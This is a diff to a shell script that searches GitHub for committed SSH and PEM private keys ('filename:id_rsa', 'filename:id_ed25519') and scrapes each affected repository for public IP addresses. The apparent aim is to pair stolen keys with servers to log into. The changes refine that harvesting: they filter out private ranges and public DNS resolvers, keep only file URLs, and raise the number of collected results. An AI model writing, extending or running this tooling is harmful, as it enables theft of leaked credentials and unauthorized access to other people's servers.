@@ -45,8 +45,9 @@ repo_hosts() {
     if curl -fsSL "https://codeload.github.com/$1/tar.gz/HEAD" 2>/dev/null \
          | tar -xz -C "$d" 2>/dev/null; then
         grep -rhoE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$d" 2>/dev/null \
-          | grep -vE '^(127\.|0\.|255\.|169\.254\.)' \
-          | sort -u | head -n 5
+          | grep -vE '^(0\.|10\.|127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|255\.)' \
+          | grep -vE '^(8\.8\.8\.8|8\.8\.4\.4|1\.1\.1\.1|114\.114\.114\.114|223\.5\.5\.5)$' \
+          | sort -u | head -n 6
     fi
     rm -rf "$d"
 }
@@ -58,12 +59,16 @@ harvest() {
         return 0
     fi
     : > "$WORK/urls.txt"; : > "$WORK/repos.txt"
+    # NOTE: each search result carries three html_urls - owner, repository and
+    # the file itself. Only the file one contains /blob/, so keep just those,
+    # otherwise an org URL can register a repo name and shadow the real key URL.
     for q in 'filename:id_rsa' 'filename:id_ed25519' 'filename:.pem+PRIVATE+KEY'; do
         api "https://api.github.com/search/code?q=$q&per_page=20" 2>/dev/null \
           | grep -oE '"html_url": *"[^"]+"' \
+          | grep '/blob/' \
           | sed -e 's/.*"https:/https:/' -e 's/"$//' >> "$WORK/urls.txt" || true
     done
-    sort -u "$WORK/urls.txt" | head -n "$((MAX_REPOS * 4))" > "$WORK/urls.sorted"
+    sort -u "$WORK/urls.txt" | head -n "$((MAX_REPOS * 6))" > "$WORK/urls.sorted"
 
     while read -r url; do
         [ -n "${url:-}" ] || continue
@@ -71,6 +76,7 @@ harvest() {
         repo=$(printf '%s' "$rest" | cut -d/ -f1,2)
         ref=$(printf '%s' "$rest" | cut -d/ -f4)
         path=$(printf '%s' "$rest" | cut -d/ -f5-)
+        if [ -z "$ref" ] || [ -z "$path" ]; then continue; fi
         grep -qxF "$repo" "$WORK/repos.txt" && continue
         [ "$(tr -d ' ' < "$WORK/repos.txt" | wc -l)" -ge "$MAX_REPOS" ] && break
         printf '%s\n' "$repo" >> "$WORK/repos.txt"
